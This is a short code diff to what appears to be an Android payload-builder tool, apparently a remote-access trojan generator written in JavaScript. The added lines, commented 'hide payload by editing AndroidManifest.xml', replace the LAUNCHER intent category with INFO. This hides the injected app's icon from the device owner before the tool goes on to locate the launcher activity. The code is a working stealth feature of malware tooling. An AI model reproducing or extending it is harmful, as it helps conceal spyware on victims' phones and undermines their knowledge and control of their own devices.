@@ -305,6 +305,16 @@ app.controller("AppCtrl", ($scope) => {
                     return;
                 }
 
+                //hide payload by editing AndroidManifest.xml
+            fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (err,data) => {
+                var formatted = data.replace(/android.intent.category.LAUNCHER/g, 'android.intent.category.INFO');
+            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), formatted, 'utf8', (err) => {
+                if (err) {
+                    $appCtrl.Log('Hiding in AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
+                    return;
+                }
+                })
+        })
                 $appCtrl.Log("Fetching launcher activity...");
                 fs.readFile(launcherPath, 'utf8', (error, data) => {
                     if (error) {
